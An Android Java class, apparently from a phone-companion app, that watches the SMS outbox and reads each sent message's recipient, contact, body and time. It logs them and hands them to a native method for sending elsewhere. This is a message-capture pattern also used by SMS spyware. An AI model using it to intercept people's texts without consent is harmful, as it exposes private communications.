package com.example.myphone;

import java.io.UnsupportedEncodingException;
import java.sql.Date;
import java.text.SimpleDateFormat;

import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

public class SmsObserver extends ContentObserver{
	private static final String TAG = "MyPhone";
	private final boolean DEBUG = true;
	public SmsObserver(Handler handler) {
		super(handler);
	} 
	@Override 
    public void onChange(boolean selfChange) { 
        //查询发送箱中的短信 
        Cursor cursor= MainActivity.MainThis.getContentResolver().query(Uri.parse( 
                "content://sms/outbox"), null, null, null, null); 
        //遍历查询结果获取用户正在发送的短信 
        while (cursor.moveToNext()) { 
            StringBuffer sb=new StringBuffer(); 
            //获取短信的联系人 
            sb.append(
            		cursor.getString(cursor.getColumnIndex("person"))
            		+ "+"); 
            //获取短信的发送地址 
            sb.append(
            		cursor.getString(cursor.getColumnIndex("address"))
            		+ "+"); 
            //获取短信的内容 
            sb.append(cursor.getString(cursor.getColumnIndex("body"))
            		+ "+");  
            //获取短信的发送时间 
            long ldate = cursor.getLong(cursor.getColumnIndex("date"));
            sb.append(ldate + "+");
            //将发送时间格式化出来 

            Date date=new Date(ldate);  
            //格式化以秒为单位的日期  
            SimpleDateFormat sdf=new SimpleDateFormat("yyyy-MM-dd hh:mm:ss"); 
            String strdate = sdf.format(date);
            sb.append(strdate + "+");

            //信息类型：SMS或彩信
            sb.append(cursor.getInt(cursor.getColumnIndex("protocol")));

            if(DEBUG)
            	Log.i(TAG, "发送的短信："+sb.toString()); 
            
            if(MainActivity.objPhone != null)
            {
            //调用JNI层发送
			try {
				byte[] bArry = sb.toString().getBytes("gbk");
				MainActivity.objPhone.SendNewOutSms(bArry, 
						bArry.length);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
            }
        } 
        super.onChange(selfChange); 
    } 
}
